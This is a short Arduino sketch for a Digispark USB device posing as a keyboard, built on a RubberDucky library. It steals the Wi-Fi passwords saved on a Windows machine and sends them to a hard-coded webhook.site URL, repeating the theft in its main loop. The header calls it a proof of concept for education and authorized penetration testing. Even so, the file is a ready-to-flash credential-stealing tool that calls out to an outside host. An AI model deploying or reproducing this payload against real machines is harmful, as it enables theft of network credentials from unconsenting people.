/**
 * @file stealWindowsWifiPasswords.ino
 * @brief Example script using the RubberDucky library for Digispark to exfiltrate saved Wi-Fi passwords on Windows.
 *
 * This sketch initializes the RubberDucky interface, attempts to steal stored Wi-Fi passwords from a Windows machine,
 * and sends them to a remote webhook endpoint. It is intended for educational and authorized penetration testing purposes only.
 *
 * @note This code is a proof of concept and must not be used for malicious activities.
 *
 * @author AntonioBerna
 * @date 2025
 * @copyright GPL-3.0 License
 */

#include "RubberDucky.h"

/// @brief Webhook URL where the exfiltrated data will be sent.
#define WEBHOOK "https://webhook.site/0da29418-0b23-42fc-9ab4-a3a630aaba9a"

RubberDucky ducky;

void setup() {
  ducky.init(); ///< Initialize USB HID and other required subsystems
}

void loop() {
  ducky.refreshUSBConnection(); ///< Re-initialize USB in case of dropped connection
  ducky.stealWindowsWifiPasswords(WEBHOOK, true); ///< Execute payload to steal saved Wi-Fi credentials
  ducky.ledFeedback(10000); ///< Provide LED feedback to indicate completion
}
